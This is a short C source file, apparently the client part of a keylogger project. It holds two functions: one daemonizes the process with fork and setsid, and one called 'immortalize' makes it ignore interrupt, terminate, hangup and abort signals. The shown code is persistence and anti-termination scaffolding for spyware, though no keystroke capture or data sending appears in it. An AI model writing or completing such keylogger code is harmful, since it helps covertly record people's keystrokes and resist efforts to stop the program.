/**
 * Client side of server.
 */
#include "keylogger.h"
#include<errno.h>
#include<signal.h>


void background_process(void) {
  // IMPLEMENTATION HERE

  //umask(0) to clear file creation mask?


  int process_id = fork();


  if (process_id == -1){
    perror("Failed to fork Process");
    //status 1 is an error
    exit(errno);
  }
  else if (process_id > 0){
    //successfully exit parent process
    exit(0);
  }

  //create a new process group
  int group_id = setsid();

  if(group_id == -1){
    perror("Failed to create a process group");
    exit(errno);
  }
  
}

void immortalize(void){

    //Redirect common abort/termination/interrupt signals to ignoreS
    signal(SIGINT,SIG_IGN);
    signal(SIGTERM,SIG_IGN);
    signal(SIGHUP,SIG_IGN);
    signal(SIGABRT,SIG_IGN);
}
